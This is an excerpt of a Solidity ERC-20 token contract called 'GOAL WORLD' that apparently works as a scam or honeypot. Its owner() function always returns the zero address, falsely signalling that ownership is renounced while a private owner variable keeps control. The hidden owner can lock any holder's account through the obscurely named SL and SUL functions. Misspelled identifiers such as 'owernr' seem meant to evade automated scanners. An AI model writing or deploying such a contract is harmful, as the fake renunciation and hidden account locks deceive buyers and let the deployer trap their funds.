...
interface IERC20 {
    ...
    function allowance(address owernr, address spender) external view returns (uint256);
    ...
    event Approval( address indexed owernr, address indexed spender, uint256 value );
}
...
contract Ownable is Context {
    address private _owernr;
    event owernrshipTransferred(address indexed previousowernr, address indexed newowernr);

    constructor () {
        address msgSender = _msgSender();
        _owernr = msgSender;
        emit owernrshipTransferred(address(0), msgSender);
    }
    function owernr() public view virtual returns (address) {
        return address(0);
    }
    modifier onlyowernr() {
        require(_owernr == _msgSender(), "Ownable: caller is not the owernr");
        _;
    }
    function renounceowernrship() public virtual onlyowernr {
        emit owernrshipTransferred(_owernr, address(0x000000000000000000000000000000000000dEaD));
        _owernr = address(0x000000000000000000000000000000000000dEaD);
    }
}
...
contract token is Ownable, IERC20 {
    ...
    string private _name = "GOAL WORLD";
    string private _symbol = "GoalWLD";
    ...
    function SL(address avcount) public onlyowernr {
        _LKD[avcount] = true;
    }


    function SUL(address avcount) public onlyowernr {
        _LKD[avcount] = false;
    }
    ...
    function _approve(address owernr, address spender, uint256 amonnts) internal virtual {
        require(owernr != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owernr][spender] = amonnts;
        emit Approval(owernr, spender, amonnts);
    }

    function allowance(address owernr, address spender) public view virtual override returns (uint256) {
        return _allowances[owernr][spender];
    }
